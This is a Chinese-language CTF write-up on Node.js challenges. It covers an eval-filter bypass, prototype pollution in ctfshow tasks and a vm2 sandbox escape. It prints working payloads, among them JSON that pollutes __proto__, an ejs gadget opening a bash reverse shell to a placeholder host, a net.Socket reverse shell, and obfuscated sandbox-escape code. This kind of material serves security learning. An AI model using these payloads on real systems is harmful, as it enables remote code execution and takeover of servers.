上面有说过：nodejs 会把同名参数以数组的形式存储，并且 `JSON.parse` 可以正常解析。
    /?query={"name":"admin"&query="password":"%63tfshow"&query="isVIP":true}
直接构造同名参数，绕过逗号，这里把 c进行url编码，是因为 双引号 的url编码是 `%22`，和 `c` 连接起来就是
`%22c`，会匹配到正则表达式。
### NPUCTF2020-验证码
    const express = require('express');
    const bodyParser = require('body-parser');
    const cookieSession = require('cookie-session');
    const fs = require('fs');
    const crypto = require('crypto');
    const keys = ['123ewqrqwwq']
    function md5(s) {
        return crypto.createHash('md5')
            .update(s)
            .digest('hex');
    }
    function saferEval(str) {
        //let feng=str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&|^%<>=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g, '')
        //console.log(`replace: ${feng}`)
        if (str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&|^%<>=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g, '')) {
            return null;
        }
        //console.log(`the code will be executed is :      ${str}`)
        return eval(str);
    } // 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个
    const template = fs.readFileSync('./index.html').toString();
    function render(results) {
        return template.replace('{{results}}', results.join(''));
    }
    const app = express();
    app.use(bodyParser.urlencoded({ extended: false }));
    app.use(bodyParser.json());
    app.use(cookieSession({
        name: 'PHPSESSION',
        keys
    }));
    Object.freeze(Object);
    Object.freeze(Math);
    app.post('/', function (req, res) {
        let result = '';
        const results = req.session.results || [];
        const { e, first, second } = req.body;
        //console.log(e)
        //console.log(first)
        //console.log(second)
        if (first && second && first.length === second.length && first!==second && md5(first+keys[0]) === md5(second+keys[0])) {
            if (req.body.e) {
                try {
                    console.log("you can eval")
                    result = saferEval(req.body.e) || 'Wrong Wrong Wrong!!!';
                } catch (e) {
                    console.log(e);
                    result = 'Wrong Wrong Wrong!!!';
                }
                results.unshift(`${req.body.e}=${result}`);
            }
        } else {
            results.unshift('Not verified!');
        }
        if (results.length > 13) {
            results.pop();
        }
        req.session.results = results;
        res.send(render(req.session.results));
    });
    // 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI
    app.get('/source', function (req, res) {
        res.set('Content-Type', 'text/javascript;charset=utf-8');
        res.send(fs.readFileSync('./test.js'));
    });
    app.get('/', function (req, res) {
        res.set('Content-Type', 'text/html;charset=utf-8');
        req.session.admin = req.session.admin || 0;
        res.send(render(req.session.results = req.session.results || []))
    });
    app.listen(39123, '0.0.0.0', () => {
        console.log('Start listening')
    });
第一层判断
`if (first && second && first.length === second.length && first!==second &&
md5(first+keys[0]) === md5(second+keys[0]))`
这里用之前讲过的变量拼接来绕过`{"e":"2-1","first":"1","second":[1]}`
然后就是 `result = saferEval(req.body.e) || 'Wrong Wrong Wrong!!!';`
    function saferEval(str) {
        if (str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&|^%<>=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g, '')) {
            return null;
        }
        return eval(str);
    } // 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个
这边过滤了很多。利用constructor这个构造函数属性可以拿到Function，然后正常rce。
    Math=Math.constructor,
    Math.constructor("return process.mainModule.require('child_process').execSync('dir').toString()")()
但是字符串是被过滤了的。这里进行字符串的拼接。
    Function(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,
                        99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,
                        46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,
                        95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,
                        121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()
一般的箭头函数都是用`{}`，但是因为这题只能用括号，而正好有用括号的语法，所以也可以用括号。
    (Math=>
        (Math=Math.constructor,
                Math.constructor(
                    Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,
                        99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,
                        46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,
                        95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,
                        121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()
        )
    )(Math+1)
>
> 再分析一波的话，就是首先一个箭头函数`(()=>())()`的自调用，传入的参数是`Math+1`，也就是一个字符串，字符串经过两次constructor同样是Function。
>
> 类似`Function()()`的格式，里面的函数也同样可以调用，成功执行代码，得到flag。
### 原型链污染
#### （一）
题目来源于ctfhsow-web-338。
login.js
    var express = require('express');
    var router = express.Router();
    var utils = require('../utils/common');
    /* GET home page.  */
    router.post('/', require('body-parser').json(),function(req, res, next) {
      res.type('html');
      var flag='flag_here';
      var secert = {};
      var sess = req.session;
      let user = {};
      utils.copy(user,req.body);
      if(secert.ctfshow==='36dboy'){
        res.end(flag);
      }else{
        return res.json({ret_code: 2, ret_msg: '登录失败'+JSON.stringify(user)});  
      }
    });
    module.exports = router;
发现`utils.copy(user,req.body);`，可能会存在漏洞，接着看common.js。
    module.exports = {
      copy:copy
    };
    function copy(object1, object2){
        for (let key in object2) {
            if (key in object2 && key in object1) {
                copy(object1[key], object2[key])
            } else {
                object1[key] = object2[key]             //漏洞产生点
            }
        }
      }
我们需要使得secert.ctfshow==='36dboy'，去拿flag。
这里的 `secert` 是一个数组，然后 `utils.copy(user,req.body);` 操作是 `user` 也是数组，也就是我们通过
`req.body` 即 POST 请求体传入参数，通过 `user` 污染数组的原型，那么 `secert` 数组找不到 `ctfshow`
属性时，会一直往原型找，直到在数组原型中发现 `ctfshow` 属性值为 `36dboy` 。那么 `if` 语句即判断成功，就会输出 flag 了。
    {"__proto__": {"ctfshow": "36dboy"}}
还有一种解法：利用ejs模块RCE。
    {"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/xxxx/1234 0>&1\"');var __tmp2"}}
#### （二）
题目来源于ctfhsow-web-339。
login.js
    if(secert.ctfshow===flag){
        res.end(flag);
      }else{
        return res.json({ret_code: 2, ret_msg: '登录失败'+JSON.stringify(user)});  
      }
不能直接污染了。但是我们发现一个api.js。
    /* GET home page.  */
    router.post('/', require('body-parser').json(),function(req, res, next) {
      res.type('html');
      res.render('api', { query: Function(query)(query)});
    });
当我们访问api.js时，可以调query的function，与上述p神出的题非常类似。写个测试代码看看。
    function copy(object1, object2){
        for (let key in object2) {
            if (key in object2 && key in object1) {
                copy(object1[key], object2[key])
            } else {
                object1[key] = object2[key]
            }
        }
      }
    user = {}
    yake = "daigua"
    body = JSON.parse('{"__proto__":{"query":"return yake"}}');
    copy(user, body)
    { query: Function(query)(query)}
可以发现，query的功能为return
"daigua"，在copy时，相当于给Object对象添加了query。那么，当然可以在这里构造一个函数，进行RCE。
有一点需要注意，require可能不会被识别，需要利用global.process.mainModule.constructor._load。
因为 node 是基于 chrome v8 内核的，运行时，压根就不会有 `require` 这种关键字，模块加载不进来，自然 shell
就反弹不了了。但在 node交互环境，或者写 js 文件时，通过 node 运行会自动把 `require` 进行编译。
    {"__proto__": {"query": "return (function(){
    var net = global.process.mainModule.constructor._load('net'),
    cp = global.process.mainModule.constructor._load('child_process'),
    sh = cp.spawn('/bin/sh', []);
    var client = new net.Socket();
    client.connect(1234, 'xxxx', 
    function({client.pipe(sh.stdin);
            sh.stdout.pipe(client);
            sh.stderr.pipe(client);});
            return /a/;})
            ();"
    }
    }
在login传入，然后访问api即可。当然也可以污染ejs模块RCE。
### HFCTF2020-JustEscape
主页面提示在run.php中的code要进行编码才能运算。
js中捕获异常堆栈信息—Error().stack。传入 发现是vm2的沙盒逃逸。
直接用别人写的payload试试
    const {VM} = require('vm2');
    const untrusted = '(' + function(){
        TypeError.prototype.get_process = f=>f.constructor("return process")();
        try{
            Object.preventExtensions(Buffer.from("")).a = 1;
        }catch(e){
            return e.get_process(()=>{}).mainModule.require("child_process").execSync("whoami").toString();
        }
    }+')()';
    try{
        console.log(new VM().run(untrusted));
    }catch(x){
        console.log(x);
    }
毫无疑问，waf拦截下来了。
`['for', 'while', 'process', 'exec', 'eval', 'constructor', 'prototype',
'Function', '+', '"',''']`
上面有讲过NodeJS的特性，可以用[`${`${`prototyp`}e`}`]代替prototype。
也可以[`p`,`r`,`o`,`t`,`o`,`t`,`y`,`p`,`e`]。
    (function (){
        TypeError[`${`${`prototyp`}e`}`][`${`${`get_proces`}s`}`] = f=>f[`${`${`constructo`}r`}`](`${`${`return this.proces`}s`}`)();
        try{
            Object.preventExtensions(Buffer.from(``)).a = 1;
        }catch(e){
            return e[`${`${`get_proces`}s`}`](()=>{}).mainModule[`${`${`requir`}e`}`](`${`${`child_proces`}s`}`)[`${`${`exe`}cSync`}`](`whoami`).toString();
        }
    })()
# 参考链接
[几个node模板引擎的原型链污染分析](https://lonmar.cn/2021/02/22/几个node模板引擎的原型链污染分析/)